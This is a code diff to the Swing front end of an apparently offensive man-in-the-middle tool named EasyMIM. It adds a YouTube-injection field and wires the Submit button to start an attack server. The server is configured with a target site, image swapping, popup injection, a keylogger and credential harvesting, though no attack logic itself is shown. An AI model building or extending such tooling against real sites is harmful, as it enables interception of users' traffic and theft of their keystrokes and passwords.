@@ -1,15 +1,21 @@
 package ui;
 import java.awt.BorderLayout;
 import java.awt.Dimension;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
 import java.net.URL;
+import java.util.ArrayList;
 
 import javax.swing.*;
 import javax.swing.GroupLayout.Alignment;
 
+import DataStructures.EasyMIMConfig;
+import Server.EasyMIMServer;
+
 public class EasyMIMUI {
 	
 	
-	
+	private static EasyMIMServer server;
 	/**
 	 * 
 	 */
@@ -46,28 +52,70 @@ public class EasyMIMUI {
 		logo.add(icon);
 		
 		JLabel targetURL = new JLabel("Target URL");
-		JTextField targetURLField = new JTextField();
+		final JTextField targetURLField = new JTextField();
 		targetURLField.setToolTipText("Enter the site you want to attack");
 
 		JLabel swapImageLabel = new JLabel("Swap image");
 		//JButton chooseImageBttn = new JButton("Choose Image");
-		JTextField urlImageTextField = new JTextField();
+		final JTextField urlImageTextField = new JTextField();
 		urlImageTextField.setToolTipText("Enter the image url");
 		urlImageTextField.setPreferredSize(urlImageTextField.getPreferredSize());
 		
+		JLabel videoLabel = new JLabel("Force YouTube Video to Play");
+		//JButton chooseImageBttn = new JButton("Choose Image");
+		final JTextField videoTextField = new JTextField();
+		videoTextField.setToolTipText("Enter the the youtube video embedded url");
+		videoTextField.setPreferredSize(videoTextField.getPreferredSize());
+		
 		JLabel popUpLabel = new JLabel("Popup message");
-		JTextField popUpInput = new JTextField();
+		final JTextField popUpInput = new JTextField();
 		popUpInput.setToolTipText("Enter website pop up message");
 		
 		JLabel enableKeyLogger = new JLabel("Key logger");
-		JCheckBox isKeyLogging = new JCheckBox();
+		final JCheckBox isKeyLogging = new JCheckBox();
 		
 		JLabel enableCredentialHavest = new JLabel("Save credential");
-		JCheckBox isSaveCredential = new JCheckBox();
+		final JCheckBox isSaveCredential = new JCheckBox();
 		
 		JButton submit = new JButton("Submit");
 		
-		//submit.addActionListener(arg0)
+		submit.addActionListener(new ActionListener(){
+
+			@Override
+			public void actionPerformed(ActionEvent arg0) {
+				// TODO Auto-generated method stub
+				if(server!=null){
+					try {
+						server.terminateServer();
+					} catch (Exception e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+				}
+				EasyMIMConfig config = new EasyMIMConfig();
+				config.targetURL = new ArrayList<String>();
+				config.targetURL.add(targetURLField.getText());
+				config.imageURL = urlImageTextField.getText();
+				config.keylogger = isKeyLogging.isEnabled();
+				config.saveCred = isSaveCredential.isEnabled();
+				config.popUpMessage = popUpInput.getText();
+				config.youtubeURL = videoTextField.getText();
+				server = new EasyMIMServer(config);
+				Thread t = new Thread(new Runnable(){
+
+					@Override
+					public void run() {
+						// TODO Auto-generated method stub
+						try {
+							server.startServer();
+						} catch (Exception e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						}
+					}});
+				t.start();
+				
+			}});
 
 		
 		pane.add(logo, BorderLayout.PAGE_START);
@@ -84,13 +132,15 @@ public class EasyMIMUI {
 		GroupLayout.SequentialGroup hGroup = MITMLayout
 				.createSequentialGroup();
 		hGroup.addGroup(MITMLayout.createParallelGroup()
-				.addComponent(targetURL).addComponent(swapImageLabel).
+				.addComponent(targetURL).addComponent(swapImageLabel)
+				.addComponent(videoLabel).
 				addComponent(popUpLabel).addComponent(enableKeyLogger).
 				addComponent(enableCredentialHavest));
 		
 		hGroup.addGroup(MITMLayout.createParallelGroup()
 				.addComponent(targetURLField)
 				.addGroup(MITMLayout.createSequentialGroup()/*.addComponent(chooseImageBttn)*/.addComponent(urlImageTextField))
+				.addComponent(videoTextField)
 				.addComponent(popUpInput)
 				.addComponent(isKeyLogging)
 				.addComponent(isSaveCredential));
@@ -104,6 +154,7 @@ public class EasyMIMUI {
 		vGroup.addGroup(MITMLayout.createParallelGroup(Alignment.BASELINE)
 				.addComponent(swapImageLabel)
 				/*.addComponent(chooseImageBttn)*/.addComponent(urlImageTextField));
+		vGroup.addGroup(MITMLayout.createParallelGroup(Alignment.BASELINE).addComponent(videoLabel).addComponent(videoTextField));
 		vGroup.addGroup(MITMLayout.createParallelGroup(Alignment.BASELINE)
 				.addComponent(popUpLabel).addComponent(popUpInput));
 		vGroup.addGroup(MITMLayout.createParallelGroup(Alignment.BASELINE)
